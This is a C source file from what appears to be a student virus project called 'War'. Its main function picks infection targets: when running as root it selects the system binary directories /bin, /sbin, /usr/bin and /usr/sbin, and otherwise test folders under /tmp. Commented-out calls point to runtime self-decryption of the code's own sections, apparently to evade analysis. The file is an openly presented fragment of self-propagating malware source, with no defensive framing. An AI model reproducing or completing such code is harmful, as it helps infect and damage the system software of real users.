/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/11 11:27:37 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Looking for uid and directory
*/

void	war(t_data *data)
{

	/* revert_two(&data->key, (char*)opening, (size_t)war - (size_t)opening); */

#ifdef DEBUG
	char de[] = "war\t\t0\n";
	data->context == true ?	de[5] = 49 : 0;
	_log(de, _strlen(de));
#endif

	if (data->context == false)
		end(data);

	if (_getuid() == 0)
	{
		t_directory root = {_random_number(ROOT_ENTRY), {"/bin", "/sbin", "/usr/bin", "/usr/sbin"}};
		/* update_two(&data->key, (char*)war, (size_t)locate - (size_t)war); */
		/* revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
		locate(data, &root);
	}
	else
	{
		t_directory user = {_random_number(USER_ENTRY), {"/tmp/test", "/tmp/test2"}};
		/* update_two(&data->key, (char*)war, (size_t)locate - (size_t)war); */
		/* revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
		locate(data, &user);
	}
}
